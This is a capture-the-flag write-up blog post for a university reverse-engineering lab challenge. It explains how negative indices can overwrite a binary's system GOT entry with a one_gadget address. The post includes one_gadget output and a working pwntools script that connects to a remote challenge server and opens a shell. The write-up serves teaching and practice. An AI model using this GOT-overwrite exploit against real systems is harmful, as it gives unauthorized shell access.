---
layout: post
title:  UNIBUC_RE_lab_7_task_2
image: /assets/img/UNIBUC_RE.jpg
date:   2022-09-01 16:39:01
tags:
- pwn
description: This challenge is a challenge where we can modify bytes in memory using indices.
categories:
- UNIBUC RE
---

This challenge is a challenge where we can modify bytes in memory using indices.

Security of the binary:
```
Not stripped
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```
Vulnerable function is :

![](/assets/img/2022-09-02-15-45-45.png)


The exploit is done by negative indices, we use onegadget to get the gadget so we get system:
```
one_gadget libc.so
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
Find some call to modify that is not called every time:
![](/assets/img/2022-09-02-16-00-50.png)
system call is only done when we are finished modifying so we will modify system got address.
0x4038-system
0x4080-array
difference is 72 so we modify offsets 72 and 71 and we try 16 times in order for our exploit to be successful because of random addresses (the last 3 nibbles are ok)
```
from pwn import *

io=remote('45.76.91.112', 10072)
#io = process("./task02")

io.recvuntil("Do you like the")
io.sendline('N')

io.sendline( '-72 22')
io.recvuntil("Finished")
io.sendline( 'N')
io.recvuntil("modify")


#gdb.attach(io,"break *vuln+253")
io.sendline( '-71 82')
io.sendline( 'Y')


io.sendline('ls')

io.interactive()
```